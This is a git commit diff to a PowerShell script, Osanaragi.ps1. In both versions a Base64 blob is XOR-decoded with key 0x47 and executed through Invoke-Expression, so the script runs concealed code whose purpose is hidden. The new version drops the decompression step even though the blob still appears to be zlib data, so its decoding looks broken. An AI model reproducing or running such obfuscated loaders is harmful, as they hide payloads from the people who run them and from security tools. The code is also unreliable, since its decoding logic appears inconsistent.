830a11c3f0c0d8a12ff9b9b7799c76e5d5c1b867
King Zuy <74240904+kingzuy@users.noreply.github.com>
2025-12-06 00:22:04 +0700

    a

--- Osanaragi.ps1
+++ Osanaragi.ps1
@@ -1,16 +1,15 @@
-$compressedData = [Convert]::FromBase64String("eJx9kM0OgjAMhu/9ijuSkQwYufgFgxcSosJhMyD2r4vjprC4NPVJ37z91hkAQMBC1pVLpTIdh1y3lCBfFh+KYv9k08yWqzw8q7m85yW7tlRDUV5Cdhp0zzIX14c8RppaqUqkI9LFi3Qe0PQR6wU4HpogMHZCeF3ZPxr4Yl3mSMsNl9rAFhGTWIlqPllqX32iNTG4IyM6j5p9DNN1V6w55M7Nz2cyKj/x1g/LsDUxT3PFmhPHyUG2vkvL4jsDb6qf")
+# File: Osanaragi_simple.ps1
+# Hanya Base64 + XOR tanpa kompresi zlib
+
+$encodedData = [Convert]::FromBase64String("eJx9kM0OgjAMhu/9ijuSkQwYufgFgxcSosJhMyD2r4vjprC4NPVJ37z91hkAQMBC1pVLpTIdh1y3lCBfFh+KYv9k08yWqzz8q7m85yW7tlRDUV5Cdhp0zzIX14c8RppaqUqkI9LFi3Qe0PQR6wU4HpogMHZCeF3ZPxr4Yl3mSMsNl9rAFhGTWIlqPllqX32iNTG4IyM6j5p9DNN1V6w55M7Nz2cyKj/x1g/LsDUxT3PFmhPHyUG2vkvL4jsDb6qf")
 $key = 0x47
 
-for ($i = 0; $i -lt $compressedData.Length; $i++) {
-    $compressedData[$i] = $compressedData[$i] -bxor $key
+# XOR Decrypt
+$decryptedBytes = New-Object byte[] $encodedData.Length
+for ($i = 0; $i -lt $encodedData.Length; $i++) {
+    $decryptedBytes[$i] = $encodedData[$i] -bxor $key
 }
 
-$ms = New-Object System.IO.MemoryStream(,$compressedData)
-$gs = New-Object System.IO.Compression.GzipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
-$sr = New-Object System.IO.StreamReader($gs)
-$decodedScript = $sr.ReadToEnd()
-$sr.Close()
-$gs.Close()
-$ms.Close()
-
-Invoke-Expression $decodedScript
+# Convert to string and execute
+$decryptedScript = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
+Invoke-Expression $decryptedScript
